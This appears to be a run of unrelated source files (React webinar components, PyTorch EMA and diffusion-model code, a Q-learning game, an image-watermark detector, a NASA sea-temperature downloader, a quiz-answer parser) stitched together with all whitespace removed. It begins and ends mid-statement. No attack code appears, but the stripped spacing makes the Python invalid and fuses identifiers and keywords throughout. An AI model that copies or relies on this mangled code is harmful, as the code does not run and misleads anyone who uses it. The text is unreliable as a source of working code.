semibold'>{name}</span><divclassName='text-gray-500'>{major}<br/>Classof{graduationYear}</div></div></div>);};exportdefaultSubtitle;importWebinarGridfrom'@/components/grid/WebinarGrid';importHorizontalWebinarGridfrom'../grid/HorizontalWebinarGrid';constMainContent=()=>{return(<mainclassName='flex-1bg-whitep-6pt-0'><divclassName='max-w-6xlmx-autop-4'><h1className='text-2xlfont-boldmy-6'>UpcomingWebinars</h1><HorizontalWebinarGridgridItems={Array.from({length:10},(_,i)=>({title:`Card${i+1}`,description:`Description${i+1}`,}))}/><h1className='text-2xlfont-boldmy-6'>ForYou</h1><WebinarGridgridItems={Array.from({length:40},(_,i)=>({title:`Card${i+1}`,description:`Description${i+1}`,}))}/></div></main>);};exportdefaultMainContent;importReactfrom'react';importReactDOMfrom'react-dom/client';import'./index.css';importAppfrom'./App';importreportWebVitalsfrom'./reportWebVitals';constroot=ReactDOM.createRoot(document.getElementById('root'));root.render(<React.StrictMode><App/></React.StrictMode>);//Ifyouwanttostartmeasuringperformanceinyourapp,passafunction//tologresults(forexample:reportWebVitals(console.log))//orsendtoananalyticsendpoint.Learnmore:https://bit.ly/CRA-vitalsreportWebVitals();importtorchfromtorchimportnnclassLitEma(nn.Module):def__init__(self,model,decay=0.9999,use_num_upates=True):super().__init__()ifdecay<0.0ordecay>1.0:raiseValueError("Decaymustbebetween0and1")self.m_name2s_name={}self.register_buffer("decay",torch.tensor(decay,dtype=torch.float32))self.register_buffer("num_updates",torch.tensor(0,dtype=torch.int)ifuse_num_upateselsetorch.tensor(-1,dtype=torch.int),)forname,pinmodel.named_parameters():ifp.requires_grad:#removeas'.'-characterisnotallowedinbufferss_name=name.replace(".","")self.m_name2s_name.update({name:s_name})self.register_buffer(s_name,p.clone().detach().data)self.collected_params=[]defreset_num_updates(self):delself.num_updatesself.register_buffer("num_updates",torch.tensor(0,dtype=torch.int))defforward(self,model):decay=self.decayifself.num_updates>=0:self.num_updates+=1decay=min(self.decay,(1+self.num_updates)/(10+self.num_updates))one_minus_decay=1.0-decaywithtorch.no_grad():m_param=dict(model.named_parameters())shadow_params=dict(self.named_buffers())forkeyinm_param:ifm_param[key].requires_grad:sname=self.m_name2s_name[key]shadow_params[sname]=shadow_params[sname].type_as(m_param[key])shadow_params[sname].sub_(one_minus_decay*(shadow_params[sname]-m_param[key]))else:assertnotkeyinself.m_name2s_namedefcopy_to(self,model):m_param=dict(model.named_parameters())shadow_params=dict(self.named_buffers())forkeyinm_param:ifm_param[key].requires_grad:m_param[key].data.copy_(shadow_params[self.m_name2s_name[key]].data)else:assertnotkeyinself.m_name2s_namedefstore(self,parameters):"""Savethecurrentparametersforrestoringlater.Args:parameters:Iterableof`torch.nn.Parameter`;theparameterstobetemporarilystored."""self.collected_params=[param.clone()forparaminparameters]defrestore(self,parameters):"""Restoretheparametersstoredwiththe`store`method.UsefultovalidatethemodelwithEMAparameterswithoutaffectingtheoriginaloptimizationprocess.Storetheparametersbeforethe`copy_to`method.Aftervalidation(ormodelsaving),usethistorestoretheformerparameters.Args:parameters:Iterableof`torch.nn.Parameter`;theparameterstobeupdatedwiththestoredparameters."""forc_param,paraminzip(self.collected_params,parameters):param.data.copy_(c_param.data)fromtypingimportDict,List,Optional,Tuple,Unionimporttorchimporttorch.nnasnnfrom...modules.autoencoding.lpips.loss.lpipsimportLPIPSfrom...modules.encoders.modulesimportGeneralConditionerfrom...utilimportappend_dims,instantiate_from_configfrom.denoiserimportDenoiserclassStandardDiffusionLoss(nn.Module):def__init__(self,sigma_sampler_config:dict,loss_weighting_config:dict,loss_type:str="l2",offset_noise_level:float=0.0,batch2model_keys:Optional[Union[str,List[str]]]=None,):super().__init__()assertloss_typein["l2","l1","lpips"]self.sigma_sampler=instantiate_from_config(sigma_sampler_config)self.loss_weighting=instantiate_from_config(loss_weighting_config)self.loss_type=loss_typeself.offset_noise_level=offset_noise_levelifloss_type=="lpips":self.lpips=LPIPS().eval()ifnotbatch2model_keys:batch2model_keys=[]ifisinstance(batch2model_keys,str):batch2model_keys=[batch2model_keys]self.batch2model_keys=set(batch2model_keys)defget_noised_input(self,sigmas_bc:torch.Tensor,noise:torch.Tensor,input:torch.Tensor)->torch.Tensor:noised_input=input+noise*sigmas_bcreturnnoised_inputdefforward(self,network:nn.Module,denoiser:Denoiser,conditioner:GeneralConditioner,input:torch.Tensor,batch:Dict,)->torch.Tensor:cond=conditioner(batch)returnself._forward(network,denoiser,cond,input,batch)def_forward(self,network:nn.Module,denoiser:Denoiser,cond:Dict,input:torch.Tensor,batch:Dict,)->Tuple[torch.Tensor,Dict]:additional_model_inputs={key:batch[key]forkeyinself.batch2model_keys.intersection(batch)}sigmas=self.sigma_sampler(input.shape[0]).to(input)noise=torch.randn_like(input)ifself.offset_noise_level>0.0:offset_shape=((input.shape[0],1,input.shape[2])ifself.n_framesisnotNoneelse(input.shape[0],input.shape[1]))noise=noise+self.offset_noise_level*append_dims(torch.randn(offset_shape,device=input.device),input.ndim,)sigmas_bc=append_dims(sigmas,input.ndim)noised_input=self.get_noised_input(sigmas_bc,noise,input)model_output=denoiser(network,noised_input,sigmas,cond,**additional_model_inputs)w=append_dims(self.loss_weighting(sigmas),input.ndim)returnself.get_loss(model_output,input,w)defget_loss(self,model_output,target,w):ifself.loss_type=="l2":returntorch.mean((w*(model_output-target)**2).reshape(target.shape[0],-1),1)elifself.loss_type=="l1":returntorch.mean((w*(model_output-target).abs()).reshape(target.shape[0],-1),1)elifself.loss_type=="lpips":loss=self.lpips(model_output,target).reshape(-1)returnlosselse:raiseNotImplementedError(f"Unknownlosstype{self.loss_type}")importnumpyasnp#Definethestatespaceandactionspacestate_space_size=22#Including0flagsasastateaction_space_size=4#Numberofpossibleactions(0,1,2,3)#InitializeQ-tablewithzerosQ=np.zeros((state_space_size,action_space_size))#Definehyperparameterslearning_rate=0.1discount_factor=0.9exploration_prob=0.2epochs=10000#Q-learningalgorithmforepochinrange(epochs):state=np.random.randint(1,state_space_size)#Randominitialstate(excluding0flags)whileTrue:#Epsilon-greedyexplorationstrategyifnp.random.rand()<exploration_prob:action=np.random.randint(action_space_size)else:action=np.argmax(Q[state,:])#Performactionandobservethenextstateandrewardnext_state=max(state-action,0)#Ensurenext_stateisnon-negativereward=1ifnext_state==0else0#Positiverewardforreaching0flags,0otherwise#UpdateQ-valueusingtheQ-learningupdateruleQ[state,action]+=learning_rate*(reward+discount_factor*np.max(Q[next_state,:])-Q[state,action])#Breakifthegameisover(0flags)ifnext_state==0:breakstate=next_state#Aftertraining,theQ-tablecanbeusedtomakeoptimaldecisionsstate=int(input("Entertheinitialnumberofflags(1to21):"))whilestate>0:print(f"\nCurrentstate:{state}flags")#ChooseactionbasedontheQ-tableaction=np.argmax(Q[state,:])print(f"RLagentremoves{action}flags")#Updatethestatebasedontheactionstate=max(state-action,0)ifstate==0:print("Congratulations!Youwon.")breakprint(f"Remainingflags:{state}flags")#Humanplayer'smoveplayer_action=int(input("Yourmove(enter1,2,or3):"))state=max(state-player_action,0)ifstate==0:print("RLagentwon.Betterlucknexttime!")breakimportrandomdefrng(n:int)->list[int]:numbers=random.sample(range(1,100+1),2*n)returnsorted(numbers[:n])+sorted(numbers[n:])defencode(n):returnn*387420489%4000000000defdecode(n):returnn*3513180409%4000000000defgenerate(n:int):numbers=rng(n)encoded=[encode(n)forninnumbers]returnencodeddefplay(ncards:int):numbers=generate(ncards)withopen('encoded.txt','w')asf:f.write(','.join([str(n)forninnumbers])+'\n')#f.write(','.join([str(decode(n))forninnumbers]))if__name__=='__main__':play(3)#print(encode(89))importargparseimportcv2importnumpyasnptry:fromimwatermarkimportWatermarkDecoderexceptImportErrorase:try:#Assumesomeoftheotherdependenciessuchastorcharenotfulfilled#importfilewithoutloadingunnecessarylibraries.importimportlib.utilimportsysspec=importlib.util.find_spec("imwatermark.maxDct")assertspecisnotNonemaxDct=importlib.util.module_from_spec(spec)sys.modules["maxDct"]=maxDctspec.loader.exec_module(maxDct)classWatermarkDecoder(object):"""Aminimalversionofhttps://github.com/ShieldMnt/invisible-watermark/blob/main/imwatermark/watermark.pytoonlyreconstructbitsusingdwtDct"""def__init__(self,wm_type="bytes",length=0):assertwm_type=="bits","Onlybitsdefinedinminimalimport"self._wmType=wm_typeself._wmLen=lengthdefreconstruct(self,bits):iflen(bits)!=self._wmLen:raiseRuntimeError("bitsarenotmatchedwithwatermarklength")returnbitsdefdecode(self,cv2Image,method="dwtDct",**configs):(r,c,channels)=cv2Image.shapeifr*c<256*256:raiseRuntimeError("imagetoosmall,shouldbelargerthan256x256")bits=[]assertmethod=="dwtDct"embed=maxDct.EmbedMaxDct(watermarks=[],wmLen=self._wmLen,**configs)bits=embed.decode(cv2Image)returnself.reconstruct(bits)except:raisee#Afixed48-bitmessagethatwaschoosenatrandom#WATERMARK_MESSAGE=0xB3EC907BB19EWATERMARK_MESSAGE=0b101100111110110010010000011110111011000110011110#bin(x)[2:]givesbitsofxasstr,useinttoconvertthemto0/1WATERMARK_BITS=[int(bit)forbitinbin(WATERMARK_MESSAGE)[2:]]MATCH_VALUES=[[27,"Nowatermarkdetected"],[33,"Partialwatermarkmatch.Cannotdeterminewithcertainty."],[35,("Likelywatermarked.Inourtest0.02%ofrealimageswere"'falselydetectedas"Likelywatermarked"'),],[49,("Verylikelywatermarked.Inourtestnorealimageswere"'falselydetectedas"Verylikelywatermarked"'),],]classGetWatermarkMatch:def__init__(self,watermark):self.watermark=watermarkself.num_bits=len(self.watermark)self.decoder=WatermarkDecoder("bits",self.num_bits)def__call__(self,x:np.ndarray)->np.ndarray:"""Detectsthenumberofmatchingbitsthepredefinedwatermarkwithoneormultipleimages.Imagesshouldbeincv2format,e.g.hxwxcBGR.Args:x:([B],hw,c)inrange[0,255]Returns:numberofmatchedbits([B],)"""squeeze=len(x.shape)==3ifsqueeze:x=x[None,...]bs=x.shape[0]detected=np.empty((bs,self.num_bits),dtype=bool)forkinrange(bs):detected[k]=self.decoder.decode(x[k],"dwtDct")result=np.sum(detected==self.watermark,axis=-1)ifsqueeze:returnresult[0]else:returnresultget_watermark_match=GetWatermarkMatch(WATERMARK_BITS)if__name__=="__main__":parser=argparse.ArgumentParser()parser.add_argument("filename",nargs="+",type=str,help="Imagefilestocheckforwatermarks",)opts=parser.parse_args()print("""Thisscripttriestodetectwatermarkedimages.Pleasebeawareofthefollowing:-Asthewatermarkissupposedtobeinvisible,thereistheriskthatwatermarkedimagesmaynotbedetected.-Tomaximizethechanceofdetectionmakesurethattheimagehasthesamedimensionsaswhenthewatermarkwasapplied(mostlikely1024x1024or512x512).-Specificimagemanipulationmaydrasticallydecreasethechancethatwatermarkscanbedetected.-Thereisalsothechancethatanimagehasthecharacteristicsofthewatermarkbychance.-Thewatermarkscriptispublic,anybodymaywatermarkanyimages,andcouldthereforeclaimittobegenerated.-Allnumbersbelowarebasedonatestusing10,000imageswithoutanymodificationsafterapplyingthewatermark.""")forfninopts.filename:image=cv2.imread(fn)ifimageisNone:print(f"Couldn'tread{fn}.Skipping")continuenum_bits=get_watermark_match(image)k=0whilenum_bits>MATCH_VALUES[k][0]:k+=1print(f"{fn}:{MATCH_VALUES[k][1]}",f"Bitsthatmatchedthewatermark{num_bits}from{len(WATERMARK_BITS)}\n",sep="\n\t",)importrequestsimportdatetimefromconcurrent.futuresimportThreadPoolExecutorfromPILimportImagedefdownload_sst():start=datetime.date(1998,1,1)end=datetime.date(2016,12,14)whilestart<=end:url=f'https://neo.gsfc.nasa.gov/archive/gs/MWOI_SST_D/MWOI_SST_D_{start.strftime("%Y-%m-%d")}.PNG'image=requests.get(url).contentwithopen(f'src/Data/Raw/SeaSurfaceTemperature/{start.strftime("%Y-%m-%d")}.png','wb')asf:f.write(image)start+=datetime.timedelta(days=1)importosimportpandasaspdimportwarningswarnings.filterwarnings('ignore')df=pd.DataFrame(columns=['Date','Warmth'])files=os.listdir('src/Data/Raw/SeaSurfaceTemperature')forfileinfiles:path=f'src/Data/Raw/SeaSurfaceTemperature/{file}'date=datetime.datetime.strptime(file.split('.')[0],'%Y%m%d')picture=Image.open(path).convert('RGB')#(125,146),(125,147),(126,147)total=0forcoordin{(125,146),(125,147),(126,147)}:r,g,b=picture.getpixel(coord)total+=0.299*r+0.587*g+0.114*bwarmth=total/3df=df.append({'Date':date,'Warmth':warmth},ignore_index=True)df.to_feather('src/Data/Optimized/sst.feather')print(df)importmathimportosfromtypingimportList,Optional,UnionimportnumpyasnpimporttorchfromeinopsimportrearrangefromimwatermarkimportWatermarkEncoderfromomegaconfimportListConfigfromPILimportImagefromtorchimportautocastfromsgm.utilimportappend_dimsclassWatermarkEmbedder:def__init__(self,watermark):self.watermark=watermarkself.num_bits=len(WATERMARK_BITS)self.encoder=WatermarkEncoder()self.encoder.set_watermark("bits",self.watermark)def__call__(self,image:torch.Tensor)->torch.Tensor:"""AddsapredefinedwatermarktotheinputimageArgs:image:([N,]B,RGB,H,W)inrange[0,1]Returns:sameasinputbutwatermarked"""squeeze=len(image.shape)==4ifsqueeze:image=image[None,...]n=image.shape[0]image_np=rearrange((255*image).detach().cpu(),"nbchw->(nb)hwc").numpy()[:,:,:,::-1]#torch(b,c,h,w)in[0,1]->numpy(b,h,w,c)[0,255]#watermarkinglibaryexpectsinputascv2BGRformatforkinrange(image_np.shape[0]):image_np[k]=self.encoder.encode(image_np[k],"dwtDct")image=torch.from_numpy(rearrange(image_np[:,:,:,::-1],"(nb)hwc->nbchw",n=n)).to(image.device)image=torch.clamp(image/255,min=0.0,max=1.0)ifsqueeze:image=image[0]returnimage#Afixed48-bitmessagethatwaschoosenatrandom#WATERMARK_MESSAGE=0xB3EC907BB19EWATERMARK_MESSAGE=0b101100111110110010010000011110111011000110011110#bin(x)[2:]givesbitsofxasstr,useinttoconvertthemto0/1WATERMARK_BITS=[int(bit)forbitinbin(WATERMARK_MESSAGE)[2:]]embed_watermark=WatermarkEmbedder(WATERMARK_BITS)defget_unique_embedder_keys_from_conditioner(conditioner):returnlist({x.input_keyforxinconditioner.embedders})defperform_save_locally(save_path,samples):os.makedirs(os.path.join(save_path),exist_ok=True)base_count=len(os.listdir(os.path.join(save_path)))samples=embed_watermark(samples)forsampleinsamples:sample=255.0*rearrange(sample.cpu().numpy(),"chw->hwc")Image.fromarray(sample.astype(np.uint8)).save(os.path.join(save_path,f"{base_count:09}.png"))base_count+=1classImg2ImgDiscretizationWrapper:"""wrapsadiscretizer,andprunesthesigmasparams:strength:floatbetween0.0and1.0.1.0meansfullsampling(allsigmasarereturned)"""def__init__(self,discretization,strength:float=1.0):self.discretization=discretizationself.strength=strengthassert0.0<=self.strength<=1.0def__call__(self,*args,**kwargs):#sigmasstartlargefirst,anddecreasethensigmas=self.discretization(*args,**kwargs)print(f"sigmasafterdiscretization,beforepruningimg2img:",sigmas)sigmas=torch.flip(sigmas,(0,))sigmas=sigmas[:max(int(self.strength*len(sigmas)),1)]print("pruneindex:",max(int(self.strength*len(sigmas)),1))sigmas=torch.flip(sigmas,(0,))print(f"sigmasafterpruning:",sigmas)returnsigmasdefdo_sample(model,sampler,value_dict,num_samples,H,W,C,F,force_uc_zero_embeddings:Optional[List]=None,batch2model_input:Optional[List]=None,return_latents=False,filter=None,device="cuda",):ifforce_uc_zero_embeddingsisNone:force_uc_zero_embeddings=[]ifbatch2model_inputisNone:batch2model_input=[]withtorch.no_grad():withautocast(device)asprecision_scope:withmodel.ema_scope():num_samples=[num_samples]batch,batch_uc=get_batch(get_unique_embedder_keys_from_conditioner(model.conditioner),value_dict,num_samples,)forkeyinbatch:ifisinstance(batch[key],torch.Tensor):print(key,batch[key].shape)elifisinstance(batch[key],list):print(key,[len(l)forlinbatch[key]])else:print(key,batch[key])c,uc=model.conditioner.get_unconditional_conditioning(batch,batch_uc=batch_uc,force_uc_zero_embeddings=force_uc_zero_embeddings,)forkinc:ifnotk=="crossattn":c[k],uc[k]=map(lambday:y[k][:math.prod(num_samples)].to(device),(c,uc))additional_model_inputs={}forkinbatch2model_input:additional_model_inputs[k]=batch[k]shape=(math.prod(num_samples),C,H//F,W//F)randn=torch.randn(shape).to(device)defdenoiser(input,sigma,c):returnmodel.denoiser(model.model,input,sigma,c,**additional_model_inputs)samples_z=sampler(denoiser,randn,cond=c,uc=uc)samples_x=model.decode_first_stage(samples_z)samples=torch.clamp((samples_x+1.0)/2.0,min=0.0,max=1.0)iffilterisnotNone:samples=filter(samples)ifreturn_latents:returnsamples,samples_zreturnsamplesdefget_batch(keys,value_dict,N:Union[List,ListConfig],device="cuda"):#Hardcodeddemosetups;mightundergosomechangesinthefuturebatch={}batch_uc={}forkeyinkeys:ifkey=="txt":batch["txt"]=(np.repeat([value_dict["prompt"]],repeats=math.prod(N)).reshape(N).tolist())batch_uc["txt"]=(np.repeat([value_dict["negative_prompt"]],repeats=math.prod(N)).reshape(N).tolist())elifkey=="original_size_as_tuple":batch["original_size_as_tuple"]=(torch.tensor([value_dict["orig_height"],value_dict["orig_width"]]).to(device).repeat(*N,1))elifkey=="crop_coords_top_left":batch["crop_coords_top_left"]=(torch.tensor([value_dict["crop_coords_top"],value_dict["crop_coords_left"]]).to(device).repeat(*N,1))elifkey=="aesthetic_score":batch["aesthetic_score"]=(torch.tensor([value_dict["aesthetic_score"]]).to(device).repeat(*N,1))batch_uc["aesthetic_score"]=(torch.tensor([value_dict["negative_aesthetic_score"]]).to(device).repeat(*N,1))elifkey=="target_size_as_tuple":batch["target_size_as_tuple"]=(torch.tensor([value_dict["target_height"],value_dict["target_width"]]).to(device).repeat(*N,1))else:batch[key]=value_dict[key]forkeyinbatch.keys():ifkeynotinbatch_ucandisinstance(batch[key],torch.Tensor):batch_uc[key]=torch.clone(batch[key])returnbatch,batch_ucdefget_input_image_tensor(image:Image.Image,device="cuda"):w,h=image.sizeprint(f"loadedinputimageofsize({w},{h})")width,height=map(lambdax:x-x%64,(w,h))#resizetointegermultipleof64image=image.resize((width,height))image_array=np.array(image.convert("RGB"))image_array=image_array[None].transpose(0,3,1,2)image_tensor=torch.from_numpy(image_array).to(dtype=torch.float32)/127.5-1.0returnimage_tensor.to(device)defdo_img2img(img,model,sampler,value_dict,num_samples,force_uc_zero_embeddings=[],additional_kwargs={},offset_noise_level:float=0.0,return_latents=False,skip_encode=False,filter=None,device="cuda",):withtorch.no_grad():withautocast(device)asprecision_scope:withmodel.ema_scope():batch,batch_uc=get_batch(get_unique_embedder_keys_from_conditioner(model.conditioner),value_dict,[num_samples],)c,uc=model.conditioner.get_unconditional_conditioning(batch,batch_uc=batch_uc,force_uc_zero_embeddings=force_uc_zero_embeddings,)forkinc:c[k],uc[k]=map(lambday:y[k][:num_samples].to(device),(c,uc))forkinadditional_kwargs:c[k]=uc[k]=additional_kwargs[k]ifskip_encode:z=imgelse:z=model.encode_first_stage(img)noise=torch.randn_like(z)sigmas=sampler.discretization(sampler.num_steps)sigma=sigmas[0].to(z.device)ifoffset_noise_level>0.0:noise=noise+offset_noise_level*append_dims(torch.randn(z.shape[0],device=z.device),z.ndim)noised_z=z+noise*append_dims(sigma,z.ndim)noised_z=noised_z/torch.sqrt(1.0+sigmas[0]**2.0)#Note:hardcodedtoDDPM-likescaling.needtogeneralizelater.defdenoiser(x,sigma,c):returnmodel.denoiser(model.model,x,sigma,c)samples_z=sampler(denoiser,noised_z,cond=c,uc=uc)samples_x=model.decode_first_stage(samples_z)samples=torch.clamp((samples_x+1.0)/2.0,min=0.0,max=1.0)iffilterisnotNone:samples=filter(samples)ifreturn_latents:returnsamples,samples_zreturnsamplesimportReactfrom'react';importReactDOMfrom'react-dom/client';import'./index.css';importAppfrom'./App';importreportWebVitalsfrom'./reportWebVitals';constroot=ReactDOM.createRoot(document.getElementById('root'));root.render(<React.StrictMode><App/></React.StrictMode>);//Ifyouwanttostartmeasuringperformanceinyourapp,passafunction//tologresults(forexample:reportWebVitals(console.log))//orsendtoananalyticsendpoint.Learnmore:https://bit.ly/CRA-vitalsreportWebVitals();import{Outlet}from'react-router-dom';constLayout=()=>{return<Outlet/>;};exportdefaultLayout;{"PassengerId":"identificationnumber","Survived":"0=No,1=Yes","Pclass":"Ticketclass1=1st,2=2nd,3=3rd","Name":"Nameofpassenger","Sex":"Sexofpassenger","Age":"Ageofpassenger","SibSp":"numberofsiblingsandspouses","Parch":"numberofparentsandchildren","Ticket":"tickettype","Fare":"costofticket","Cabin":"cabinnumber","Embarked":"portofembarkation",}#withopen('answers.txt',encoding='utf-8')asf:withopen(r'C:\Users\natha\Programming\deca-dash\data\processing\answers.txt',encoding='utf-8')asf:raw=f.read()raw=raw.split('\n')defis_question(line):#returnline[0].isdigit()and'.'inline[1:4]and'Cengage'notinlineifnot(line[0].isdigit()):returnFalsepos=line.find('.')if(pos==-1):returnFalseif(pos>3):returnFalse#makesureallthedigitsinfrontoftheperiodarenumbersifnot(all(char.isdigit()forcharinline[:pos])):returnFalseif(line[pos+2]notin{'A','B','C','D'}):returnFalseif('Cengage'inline):returnFalsereturnTrueanswer_map={'A':0,'B':1,'C':2,'D':3}processed=[]source_toggle=Falsefori,lineinenumerate(raw):ifnot(any(char.isalnum()forcharinline)):continueif(line.startswith('Test')):continueif(line.startswith('SOURCE')):continueif(line.endswith('KEY')):continueif(line.startswith('Copyright')):continueif(len(line)<=2andline[0].isnumeric()):continueif(raw[max(0,i-1)].startswith('SOURCE')!=raw[i].startswith('SOURCE')):source_toggle=notsource_toggleifnot(is_question(line)):if(source_toggle):continueprocessed[-1]+=''+lineelse:processed.append(line)source_toggle=Falseprocessed=[(answer_map[line[(pos:=line.find('.'))+2]],line[pos+2+1:])forlineinprocessed]importpandasaspddf=pd.DataFrame(processed,columns=['answer','explanation'])#df.to_csv('answers.csv',index=False)print(df)fromfunctoolsimportpartialimporttorchfrom..modules.attentionimport*from..modules.diffusionmodules.utilimport(AlphaBlender,get_alpha,linear,mixed_checkpoint,timestep_embedding,)classTimeMixSequential(nn.Sequential):defforward(self,x,context=None,timesteps=None):forlayerinself:x=layer(x,context,timesteps)returnxclassBasicTransformerTimeMixBlock(nn.Module):ATTENTION_MODES={"softmax":CrossAttention,"softmax-xformers":MemoryEfficientCrossAttention,}def__init__(self,dim,n_heads,d_head,dropout=0.0,context_dim=None,gated_ff=True,checkpoint=True,timesteps=None,ff_in=False,inner_dim=None,attn_mode="softmax",disable_self_attn=False,disable_temporal_crossattention=False,switch_temporal_ca_to_sa=False,):super().__init__()attn_cls=self.ATTENTION_MODES[attn_mode]self.ff_in=ff_inorinner_dimisnotNoneifinner_dimisNone:inner_dim=dimassertint(n_heads*d_head)==inner_dimself.is_res=inner_dim==dimifself.ff_in:self.norm_in=nn.LayerNorm(dim)self.ff_in=FeedForward(dim,dim_out=inner_dim,dropout=dropout,glu=gated_ff)self.timesteps=timestepsself.disable_self_attn=disable_self_attnifself.disable_self_attn:self.attn1=attn_cls(query_dim=inner_dim,heads=n_heads,dim_head=d_head,context_dim=context_dim,dropout=dropout,)#isacross-attentionelse:self.attn1=attn_cls(query_dim=inner_dim,heads=n_heads,dim_head=d_head,dropout=dropout)#isaself-attentionself.ff=FeedForward(inner_dim,dim_out=dim,dropout=dropout,glu=gated_ff)ifdisable_temporal_crossattention:ifswitch_temporal_ca_to_sa:raiseValueErrorelse:self.attn2=Noneelse:self.norm2=nn.LayerNorm(inner_dim)ifswitch_temporal_ca_to_sa:self.attn2=attn_cls(query_dim=inner_dim,heads=n_heads,dim_head=d_head,dropout=dropout)#isaself-attentionelse:self.attn2=attn_cls(query_dim=inner_dim,context_dim=context_dim,heads=n_heads,dim_head=d_head,dropout=dropout,)#isself-attnifcontextisnoneself.norm1=nn.LayerNorm(inner_dim)self.norm3=nn.LayerNorm(inner_dim)self.switch_temporal_ca_to_sa=switch_temporal_ca_to_saself.checkpoint=checkpointifself.checkpoint:logpy.info(f"{self.__class__.__name__}isusingcheckpointing")defforward(self,x:torch.Tensor,context:torch.Tensor=None,timesteps:int=None)->torch.Tensor:ifself.checkpoint:returncheckpoint(self._forward,x,context,timesteps)else:returnself._forward(x,context,timesteps=timesteps)def_forward(self,x,context=None,timesteps=None):assertself.timestepsortimestepsassertnot(self.timestepsandtimesteps)orself.timesteps==timestepstimesteps=self.timestepsortimestepsB,S,C=x.shapex=rearrange(x,"(bt)sc->(bs)tc",t=timesteps)ifself.ff_in:x_skip=xx=self.ff_in(self.norm_in(x))ifself.is_res:x+=x_skipifself.disable_self_attn:x=self.attn1(self.norm1(x),context=context)+xelse:x=self.attn1(self.norm1(x))+xifself.attn2isnotNone:ifself.switch_temporal_ca_to_sa:x=self.attn2(self.norm2(x))+xelse:x=self.attn2(self.norm2(x),context=context)+xx_skip=xx=self.ff(self.norm3(x))ifself.is_res:x+=x_skipx=rearrange(x,"(bs)tc->(bt)sc",s=S,b=B//timesteps,c=C,t=timesteps)returnxdefget_last_layer(self):returnself.ff.net[-1].weightclassPostHocSpatialTransformerWithTimeMixing(SpatialTransformer):def__init__(self,in_channels,n_heads,d_head,depth=1,dropout=0.0,use_linear=False,context_dim=None,use_spatial_context=False,timesteps=None,merge_strategy:str="fixed",merge_factor:float=0.5,apply_sigmoid_to_merge:bool=True,time_context_dim=None,ff_in=False,checkpoint=False,time_depth=1,attn_mode="softmax",disable_self_attn=False,disable_temporal_crossattention=False,time_mix_legacy:bool=True,max_time_embed_period:int=10000,):super().__init__(in_channels,n_heads,d_head,depth=depth,dropout=dropout,attn_type=attn_mode,use_checkpoint=checkpoint,context_dim=context_dim,use_linear=use_linear,disable_self_attn=disable_self_attn,)self.time_depth=time_depthself.depth=depthself.max_time_embed_period=max_time_embed_periodtime_mix_d_head=d_headn_time_mix_heads=n_headstime_mix_inner_dim=int(time_mix_d_head*n_time_mix_heads)inner_dim=n_heads*d_headifuse_spatial_context:time_context_dim=context_dimself.time_mix_blocks=nn.ModuleList([BasicTransformerTimeMixBlock(inner_dim,n_time_mix_heads,time_mix_d_head,dropout=dropout,context_dim=time_context_dim,timesteps=timesteps,checkpoint=checkpoint,ff_in=ff_in,inner_dim=time_mix_inner_dim,attn_mode=attn_mode,disable_self_attn=disable_self_attn,disable_temporal_crossattention=disable_temporal_crossattention,)for_inrange(self.depth)])assertlen(self.time_mix_blocks)==len(self.transformer_blocks)self.use_spatial_context=use_spatial_contextself.in_channels=in_channelstime_embed_dim=self.in_channels*4self.time_mix_time_embed=nn.Sequential(linear(self.in_channels,time_embed_dim),nn.SiLU(),linear(time_embed_dim,self.in_channels),)self.time_mix_legacy=time_mix_legacyifself.time_mix_legacy:ifmerge_strategy=="fixed":self.register_buffer("mix_factor",torch.Tensor([merge_factor]))elifmerge_strategy=="learned"ormerge_strategy=="learned_with_images":self.register_parameter("mix_factor",torch.nn.Parameter(torch.Tensor([merge_factor])))elifmerge_strategy=="fixed_with_images":self.mix_factor=Noneelse:raiseValueError(f"unknownmergestrategy{merge_strategy}")self.get_alpha_fn=partial(get_alpha,merge_strategy,self.mix_factor,apply_sigmoid=apply_sigmoid_to_merge,is_attn=True,)else:self.time_mixer=AlphaBlender(alpha=merge_factor,merge_strategy=merge_strategy)defforward(self,x:torch.Tensor,context:Optional[torch.Tensor]=None,#cam:Optional[torch.Tensor]=None,time_context:Optional[torch.Tensor]=None,timesteps:Optional[int]=None,image_only_indicator:Optional[torch.Tensor]=None,cond_view:Optional[torch.Tensor]=None,cond_motion:Optional[torch.Tensor]=None,time_step:Optional[int]=None,name:Optional[str]=None,)->torch.Tensor:_,_,h,w=x.shapex_in=xspatial_context=Noneifexists(context):spatial_context=contextifself.use_spatial_context:assert(context.ndim==3),f"ndimsofspatialcontextshouldbe3butare{context.ndim}"time_context=contexttime_context_first_timestep=time_context[::timesteps]time_context=repeat(time_context_first_timestep,"b...->(bn)...",n=h*w)eliftime_contextisnotNoneandnotself.use_spatial_context:time_context=repeat(time_context,"b...->(bn)...",n=h*w)iftime_context.ndim==2:time_context=rearrange(time_context,"bc->b1c")x=self.norm(x)ifnotself.use_linear:x=self.proj_in(x)x=rearrange(x,"bchw->b(hw)c")ifself.use_linear:x=self.proj_in(x)ifself.time_mix_legacy:alpha=self.get_alpha_fn(image_only_indicator=image_only_indicator)num_frames=torch.arange(timesteps,device=x.device)num_frames=repeat(num_frames,"t->bt",b=x.shape[0]//timesteps)num_frames=rearrange(num_frames,"bt->(bt)")t_emb=timestep_embedding(num_frames,self.in_channels,repeat_only=False,max_period=self.max_time_embed_period,)emb=self.time_mix_time_embed(t_emb)emb=emb[:,None,:]forit_,(block,mix_block)inenumerate(zip(self.transformer_blocks,self.time_mix_blocks)):#spatialattentionx=block(x,context=spatial_context,time_step=time_step,name=name+'_'+str(it_))x_mix=xx_mix=x_mix+emb#temporalattentionx_mix=mix_block(x_mix,context=time_context,timesteps=timesteps)ifself.time_mix_legacy:x=alpha.to(x.dtype)*x+(1.0-alpha).to(x.dtype)*x_mixelse:x=self.time_mixer(x_spatial=x,x_temporal=x_mix,image_only_indicator=image_only_indicator,)ifself.use_linear:x=self.proj_out(x)x=rearrange(x,"b(hw)c->bchw",h=h,w=w)ifnotself.use_linear:x=self.proj_out(x)out=x+x_inreturnoutclassPostHocSpatialTransformerWithTimeMixingAndMotion(SpatialTransformer):def__init__(self,in_channels,n_heads,d_head,depth=1,dropout=0.0,use_linear=False,context_dim=None,use_spatial_context=False,timesteps=None,merge_strategy:str="fixed",merge_factor:float=0.5,apply_sigmoid_to_merge:bool=True,time_context_dim=None,ff_in=False,checkpoint=False,time_depth=1,attn_mode="softmax",disable_self_attn=False,disable_temporal_crossattention=False,time_mix_legacy:bool=True,max_time_embed_period:int=10000,):super().__init__(in_channels,n_heads,d_head,depth=depth,dropout=dropout,attn_type=attn_mode,use_checkpoint=checkpoint,context_dim=context_dim,use_linear=use_